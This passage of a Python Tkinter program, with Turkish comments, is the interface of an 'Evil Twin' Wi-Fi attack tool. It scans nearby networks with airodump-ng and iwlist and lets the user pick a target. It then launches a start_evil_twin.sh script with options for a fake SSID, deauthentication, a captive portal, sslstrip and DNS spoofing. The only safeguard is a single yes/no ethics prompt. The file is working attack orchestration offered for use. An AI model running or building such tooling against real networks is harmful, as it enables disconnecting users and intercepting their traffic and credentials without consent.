                self.log_message("Monitor interface bulunamadı", "ERROR")
                return
            
            self.log_message(f"Ağ tarama başlatılıyor: {monitor_interface} ({scan_time} saniye)")
            
            # Geçici dosya oluştur
            import tempfile
            import time
            temp_dir = tempfile.mkdtemp()
            output_file = os.path.join(temp_dir, "scan")
            
            # Geliştirilmiş airodump-ng komutu - daha fazla ağ bulması için
            cmd = [
                'sudo', 'airodump-ng', 
                '--write', output_file,
                '--output-format', 'csv',
                '--write-interval', '2',  # 2 saniye aralıkla yaz
                '--band', 'abg',  # Tüm bantları tara (2.4GHz + 5GHz)
                monitor_interface
            ]
            
            self.log_message("Airodump-ng çalıştırılıyor (tüm kanallar taranacak)...")
            
            # Process'i başlat
            self.scan_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            # Belirtilen süre kadar bekle ve sonuçları güncelle
            start_time = time.time()
            last_update = 0
            
            while time.time() - start_time < scan_time:
                if not self.scan_active:  # Kullanıcı iptal etti
                    break
                    
                current_time = time.time() - start_time
                
                # Her 3 saniyede bir sonuçları kontrol et
                if current_time - last_update >= 3:
                    csv_file = f"{output_file}-01.csv"
                    if os.path.exists(csv_file):
                        try:
                            self._parse_airodump_csv(csv_file)
                            last_update = current_time
                        except:
                            pass  # Parse hatası olabilir, devam et
                
                time.sleep(1)
            
            # Process'i sonlandır
            try:
                if self.scan_process:
                    self.scan_process.terminate()
                    self.scan_process.wait(timeout=3)
            except:
                try:
                    if self.scan_process:
                        self.scan_process.kill()
                except:
                    pass
            
            # Son sonuçları parse et
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                self._parse_airodump_csv(csv_file)
                
                unique_count = len(set(network['bssid'] for network in self.networks))
                self.log_message(f"Ağ taraması tamamlandı - {unique_count} benzersiz ağ bulundu")
                
                if unique_count < 3:  # Çok az ağ bulunduysa alternatif yöntem dene
                    self.log_message("Az ağ bulundu, iwlist ile ek tarama yapılıyor...")
                    self._try_iwlist_scan(monitor_interface)
            else:
                self.log_message("Hiçbir ağ bulunamadı", "WARNING")
                # Basit iwlist tarama dene
                self._try_iwlist_scan(monitor_interface)
                
            # Geçici dosyaları temizle
            import shutil
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
                
        except Exception as e:
            self.log_message(f"Tarama işlemi hatası: {e}", "ERROR")
        finally:
            self.scan_active = False
            self._safe_after(0, lambda: self._safe_widget_config(self.scan_btn, text="🔍 Taramayı Başlat", state='normal'))
            
    def _extended_scan_networks(self):
        """Geniş ağ taraması - kanal değiştirme ile"""
        try:
            monitor_interface = self.monitor_interface_var.get()
            
            if not monitor_interface:
                self.log_message("Monitor interface bulunamadı", "ERROR")
                return
            
            # Önemli kanallar listesi (2.4GHz ve 5GHz)
            channels_2g = [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
            channels_5g = [36, 40, 44, 48, 149, 153, 157, 161, 165]
            all_channels = channels_2g + channels_5g
            
            self.log_message(f"Kanal değiştirme taraması başlatılıyor ({len(all_channels)} kanal)...")
            
            import tempfile
            import time
            
            # Her kanal için tarama
            for i, channel in enumerate(all_channels):
                if not self.scan_active:
                    break
                    
                try:
                    # Kanalı değiştir
                    subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', str(channel)], 
                                 capture_output=True, timeout=3)
                    
                    self.log_message(f"Kanal {channel} taranıyor... ({i+1}/{len(all_channels)})")
                    
                    # Geçici dosya
                    temp_dir = tempfile.mkdtemp()
                    output_file = os.path.join(temp_dir, f"scan_ch{channel}")
                    
                    # Bu kanal için kısa tarama (3 saniye)
                    cmd = [
                        'sudo', 'timeout', '3',
                        'airodump-ng', 
                        '--write', output_file,
                        '--output-format', 'csv',
                        '--channel', str(channel),
                        monitor_interface
                    ]
                    
                    subprocess.run(cmd, capture_output=True, text=True)
                    
                    # Sonuçları parse et
                    csv_file = f"{output_file}-01.csv"
                    if os.path.exists(csv_file):
                        self._parse_airodump_csv(csv_file)
                    
                    # Temizlik
                    import shutil
                    try:
                        shutil.rmtree(temp_dir)
                    except:
                        pass
                        
                except Exception as e:
                    self.log_message(f"Kanal {channel} tarama hatası: {e}", "WARNING")
                    continue
            
            # iwlist ile ek tarama
            if self.scan_active:
                self.log_message("iwlist ile ek tarama yapılıyor...")
                self._try_iwlist_scan(monitor_interface)
            
            unique_count = len(set(network['bssid'] for network in self.networks))
            self.log_message(f"Geniş tarama tamamlandı - {unique_count} benzersiz ağ bulundu")
            
        except Exception as e:
            self.log_message(f"Geniş tarama hatası: {e}", "ERROR")
        finally:
            self.scan_active = False
            self._safe_after(0, lambda: self._safe_widget_config(self.scan_btn, text="🔍 Taramayı Başlat", state='normal'))
            
    def _parse_airodump_csv(self, csv_file):
        """Airodump CSV dosyasını parse et - duplikatları kaldır"""
        try:
            with open(csv_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # CSV'yi satırlara ayır
            lines = content.strip().split('\n')
            
            # Mevcut ağları BSSID'ye göre takip et (duplikat önleme)
            existing_bssids = set()
            if hasattr(self, 'networks') and self.networks:
                existing_bssids = set(network['bssid'] for network in self.networks)
            else:
                self.networks = []
                # TreeView'i temizle
                self._safe_after(0, lambda: self._clear_networks_tree())
            
            count = len(self.networks)
            parsing_stations = False
            new_networks = []
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                    
                # Station kısmına geldiğinde dur
                if line.startswith('Station MAC'):
                    parsing_stations = True
                    continue
                    
                if parsing_stations:
                    continue
                    
                # BSSID satırını atla
                if line.startswith('BSSID'):
                    continue
                    
                # Ağ verisini parse et
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    first_seen = parts[1]
                    last_seen = parts[2]
                    channel = parts[3]
                    speed = parts[4]
                    privacy = parts[5]
                    cipher = parts[6]
                    auth = parts[7]
                    power = parts[8]
                    beacons = parts[9]
                    iv = parts[10]
                    lan_ip = parts[11]
                    id_length = parts[12]
                    essid = parts[13] if len(parts) > 13 else ""
                    
                    # Geçerli BSSID kontrolü ve duplikat önleme
                    if (bssid and bssid != 'BSSID' and bssid != '' and 
                        len(bssid) == 17 and ':' in bssid and  # Geçerli MAC formatı
                        bssid not in existing_bssids):
                        
                        count += 1
                        network = {
                            'no': count,
                            'ssid': essid if essid and essid != ' ' else "<Hidden>",
                            'bssid': bssid,
                            'channel': channel if channel and channel.isdigit() else "?",
                            'security': privacy if privacy else "Open",
                            'signal': power if power else "?"
                        }
                        
                        # Duplikat kontrolü
                        existing_bssids.add(bssid)
                        self.networks.append(network)
                        new_networks.append(network)
            
            # Yeni ağları TreeView'e ekle
            for network in new_networks:
                self._safe_after(0, lambda n=network: self._safe_treeview_insert(n))
            
            unique_count = len(set(network['bssid'] for network in self.networks))
            if new_networks:
                self.log_message(f"{len(new_networks)} yeni ağ bulundu (toplam: {unique_count})")
                        
        except Exception as e:
            self.log_message(f"CSV parse hatası: {e}", "ERROR")
    
    def _clear_networks_tree(self):
        """Ağ listesini temizle"""
        try:
            if self.networks_tree and self.networks_tree.winfo_exists():
                for item in self.networks_tree.get_children():
                    self.networks_tree.delete(item)
        except (tk.TclError, RuntimeError):
            pass
    
    def _try_iwlist_scan(self, interface):
        """iwlist ile basit tarama (yedek yöntem)"""
        try:
            self.log_message("iwlist ile basit tarama deneniyor...")
            
            # Önce normal interface'i dene
            base_interface = interface.replace('mon', '')
            
            result = subprocess.run(['sudo', 'iwlist', base_interface, 'scan'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and result.stdout:
                self._parse_iwlist_output(result.stdout)
            else:
                self.log_message("iwlist tarama başarısız", "WARNING")
                self._safe_messagebox("showwarning", "Tarama Başarısız",
                    "Hiçbir ağ bulunamadı.\n\nManuel tarama için terminal'de:\n" +
                    f"sudo airodump-ng {interface}\n" +
                    "veya\n" +
                    f"sudo iwlist {base_interface} scan")
                    
        except Exception as e:
            self.log_message(f"iwlist tarama hatası: {e}", "ERROR")
    
    def _parse_iwlist_output(self, output):
        """iwlist çıktısını parse et"""
        try:
            lines = output.split('\n')
            current_network = {}
            count = len(self.networks)
            
            for line in lines:
                line = line.strip()
                
                if 'Cell' in line and 'Address:' in line:
                    # Yeni network başladı
                    if current_network and current_network.get('bssid'):
                        count += 1
                        current_network['no'] = count
                        self.networks.append(current_network.copy())
                        self._safe_after(0, lambda n=current_network.copy(): self._safe_treeview_insert(n))
                    
                    # Yeni network başlat
                    bssid = line.split('Address: ')[1] if 'Address: ' in line else ''
                    current_network = {
                        'bssid': bssid,
                        'ssid': '<Hidden>',
                        'channel': '',
                        'security': '',
                        'signal': ''
                    }
                    
                elif 'ESSID:' in line:
                    essid = line.split('ESSID:')[1].strip('"').strip()
                    if essid:
                        current_network['ssid'] = essid
                        
                elif 'Channel:' in line:
                    try:
                        channel = line.split('Channel:')[1].split(')')[0].strip()
                        current_network['channel'] = channel
                    except:
                        pass
                        
                elif 'Signal level=' in line:
                    try:
                        signal = line.split('Signal level=')[1].split()[0]
                        current_network['signal'] = signal
                    except:
                        pass
                        
                elif 'Encryption key:' in line:
                    if 'on' in line.lower():
                        current_network['security'] = 'WEP/WPA'
                    else:
                        current_network['security'] = 'Open'
            
            # Son network'u ekle
            if current_network and current_network.get('bssid'):
                count += 1
                current_network['no'] = count
                self.networks.append(current_network.copy())
                self._safe_after(0, lambda n=current_network.copy(): self._safe_treeview_insert(n))
            
            if count > len(self.networks) - count:
                self.log_message(f"iwlist ile {count - (len(self.networks) - count)} ağ bulundu")
                        
        except Exception as e:
            self.log_message(f"iwlist parse hatası: {e}", "ERROR")
            
    def _parse_scan_results(self):
        """Eski tarama sonuçlarını parse et (yedek yöntem)"""
        try:
            # CSV dosyasını oku - evil-twin ana klasöründeki logs dizininden
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            logs_dir = os.path.join(script_dir, 'logs')
            
            if not os.path.exists(logs_dir):
                return
                
            csv_files = [f for f in os.listdir(logs_dir) if f.endswith('.csv')]
            if not csv_files:
                return
                
            latest_csv = max(csv_files, key=lambda x: os.path.getctime(os.path.join(logs_dir, x)))
            self._parse_airodump_csv(os.path.join(logs_dir, latest_csv))
                            
        except Exception as e:
            self.log_message(f"Sonuç parse hatası: {e}", "ERROR")
            
    def select_target_network(self):
        """Seçili ağı hedef yap"""
        selection = self.networks_tree.selection()
        if not selection:
            self._safe_messagebox("showwarning", "Uyarı", "Lütfen bir ağ seçin")
            return
            
        item = self.networks_tree.item(selection[0])
        values = item['values']
        
        self.target_ssid_var.set(values[1])
        self.target_bssid_var.set(values[2])
        self.target_channel_var.set(values[3])
        self.fake_ssid_var.set(values[1])  # Varsayılan olarak aynı SSID
        
        self.log_message(f"Hedef seçildi: {values[1]} ({values[2]})")
        self._safe_messagebox("showinfo", "Hedef Seçildi", f"Hedef ağ: {values[1]}\nBSSID: {values[2]}")
        
        # Saldırı sekmesine geç
        self.notebook.select(2)
        
    def save_scan_results(self):
        """Tarama sonuçlarını kaydet"""
        if not self.networks:
            self._safe_messagebox("showwarning", "Uyarı", "Kaydedilecek sonuç yok")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.networks, f, indent=2)
                self.log_message(f"Sonuçlar kaydedildi: {filename}")
                self._safe_messagebox("showinfo", "Başarılı", "Tarama sonuçları kaydedildi")
            except Exception as e:
                self.log_message(f"Kaydetme hatası: {e}", "ERROR")
                
    def start_attack(self):
        """Evil Twin saldırısını başlat"""
        import platform
        
        if platform.system() == "Windows":
            self._safe_messagebox("showwarning",
                "Platform Uyarısı",
                "Evil Twin saldırısı Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi saldırıları için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Dual boot Linux sistemi\n\n"
                "Bu araçlar Linux ortamında test edilmiştir."
            )
            self.log_message("Evil Twin saldırısı Windows'ta desteklenmiyor", "WARNING")
            return
            
        # Hedef kontrolü
        if not self.target_bssid_var.get():
            self._safe_messagebox("showerror", "Hata", "Lütfen hedef ağ seçin")
            return
            
        if self.attack_active:
            self._safe_messagebox("showwarning", "Uyarı", "Saldırı zaten aktif")
            return
            
        # Etik onay
        response = self._safe_askyesno(
            "Etik Onay",
            "Bu saldırıyı sadece kendi ağınızda veya izinli ortamda yapacağınızı onaylıyor musunuz?"
        )
        
        if not response:
            return
            
        self.attack_active = True
        try:
            self.attack_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
        except (tk.TclError, RuntimeError):
            pass
        
        # Saldırıyı thread'de başlat
        attack_thread = threading.Thread(target=self._start_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
    def _start_attack(self):
        """Saldırı işlemi (thread)"""
        try:
            # Komut oluştur
            cmd = ['sudo', './scripts/start_evil_twin.sh']
            cmd.extend(['-b', self.target_bssid_var.get()])
            cmd.extend(['-c', self.target_channel_var.get()])
            
            if self.fake_ssid_var.get():
                cmd.extend(['-f', self.fake_ssid_var.get()])
                
            if not self.captive_portal_var.get():
                cmd.append('-p')
                
            if self.deauth_var.get():
                cmd.append('-d')
                
            if self.sslstrip_var.get():
                cmd.append('-S')
                
            if self.dns_spoof_var.get():
                cmd.append('-D')
                
            self.log_message(f"Saldırı başlatılıyor: {' '.join(cmd)}")
            
            # Saldırıyı başlat
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            self.attack_process = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                cwd=script_dir
            )
            
            # Çıktıyı oku
            for line in iter(self.attack_process.stdout.readline, ''):
                if line:
                    self._safe_after(0, lambda l=line: self._safe_text_insert(self.attack_status_text, l))
                    self._safe_after(0, lambda: self._safe_text_see_end(self.attack_status_text))
                    
                if not self.attack_active:
                    break
                    
        except Exception as e:
            self.log_message(f"Saldırı hatası: {e}", "ERROR")
        finally:
            self._safe_after(0, self._attack_finished)
            
    def stop_attack(self):
        """Saldırıyı durdur"""
        self.attack_active = False
        
        try:
            if hasattr(self, 'attack_process'):
                self.attack_process.terminate()
                
            # Cleanup scripti çalıştır
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            subprocess.run(['sudo', './scripts/cleanup.sh'], cwd=script_dir)
            
            self.log_message("Saldırı durduruldu")
            
        except Exception as e:
            self.log_message(f"Saldırı durdurma hatası: {e}", "ERROR")
            
    def _attack_finished(self):
        """Saldırı bittiğinde çağrılır"""
        try:
            self.attack_active = False
            if hasattr(self, 'attack_btn') and self.attack_btn and self.attack_btn.winfo_exists():
                self.attack_btn.config(state='normal')
            if hasattr(self, 'stop_btn') and self.stop_btn and self.stop_btn.winfo_exists():
                self.stop_btn.config(state='disabled')
        except (tk.TclError, RuntimeError):
            # Widget'lar yok edilmişse sessizce geç
            self.attack_active = False
        
    def refresh_logs(self):
        """Logları yenile"""
        try:
            # evil-twin ana klasöründeki logs dizinini kullan
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            log_files = [
                os.path.join(script_dir, 'logs', 'evil_twin.log'),
                os.path.join(script_dir, 'logs', 'hostapd.log'),
                os.path.join(script_dir, 'logs', 'dnsmasq.log')
            ]
            
            self.logs_text.delete(1.0, tk.END)
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    with open(log_file, 'r') as f:
                        content = f.read()
                        self.logs_text.insert(tk.END, f"=== {os.path.basename(log_file)} ===\n")
                        self.logs_text.insert(tk.END, content)
                        self.logs_text.insert(tk.END, "\n\n")
                        
            self.logs_text.see(tk.END)
            self.log_message("Loglar yenilendi")
            
        except Exception as e:
            self.log_message(f"Log yenileme hatası: {e}", "ERROR")
            
    def clear_logs(self):
        """Logları temizle"""
        response = self._safe_askyesno("Onay", "Tüm logları temizlemek istediğinizden emin misiniz?")
        if response:
            self.logs_text.delete(1.0, tk.END)
            self.log_message("Loglar temizlendi")
            
    def save_logs(self):
        """Logları kaydet"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.logs_text.get(1.0, tk.END))
                self.log_message(f"Loglar kaydedildi: {filename}")
                self._safe_messagebox("showinfo", "Başarılı", "Loglar kaydedildi")
            except Exception as e:
                self.log_message(f"Log kaydetme hatası: {e}", "ERROR")
                
    def cleanup_on_exit(self):
        """Uygulama kapatılırken temizlik işlemleri"""
        try:
            self.log_message("Uygulama kapatılıyor, temizlik yapılıyor...")
            
            # Tüm aktif işlemleri durdur
            self.scan_active = False
            self.attack_active = False
            
            # Scan process'i durdur
            if hasattr(self, 'scan_process') and self.scan_process:
                try:
                    self.scan_process.terminate()
                    self.scan_process.wait(timeout=2)
                except:
                    try:
                        self.scan_process.kill()
                    except:
                        pass
            
            # Attack process'i durdur
            if hasattr(self, 'attack_process') and self.attack_process:
                try:
                    self.attack_process.terminate()
                    self.attack_process.wait(timeout=2)
                except:
                    try:
                        self.attack_process.kill()
                    except:
                        pass
            
            # Monitor mode'u durdur
            if self.monitor_active:
                try:
                    interface = self.interface_var.get()
                    monitor_interface = self.monitor_interface_var.get() or f"{interface}mon"
                    subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_interface], 
                                 capture_output=True, timeout=5)
                    self.log_message("Monitor mode durduruldu")
                except:
                    pass
                    
        except Exception as e:
            print(f"Temizlik hatası: {e}")

def main():
    """Ana fonksiyon"""
    import signal
    
    def signal_handler(sig, frame):
        """Ctrl+C ile temiz çıkış"""
        print("\n[INFO] Uygulama kapatılıyor...")
        try:
            app.cleanup_on_exit()
            root.quit()
            root.destroy()
        except:
            pass
        exit(0)
    
    # Signal handler'i kaydet
    signal.signal(signal.SIGINT, signal_handler)
    
    root = tk.Tk()
    app = EvilTwinGUI(root)
    
    # Pencere kapatma olayı
    def on_closing():
        try:
            app.cleanup_on_exit()
            if app.attack_active:
                response = app._safe_askyesno("Onay", "Saldırı aktif. Yine de çıkmak istiyor musunuz?")
                if response:
                    app.stop_attack()
                    root.destroy()
            else:
                root.destroy()
        except:
            root.destroy()
            
    root.protocol("WM_DELETE_WINDOW", on_closing)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\n[INFO] Ctrl+C ile çıkış yapıldı")
        try:
            app.cleanup_on_exit()
            root.quit()
            root.destroy()
        except:
            pass

if __name__ == "__main__":
    main()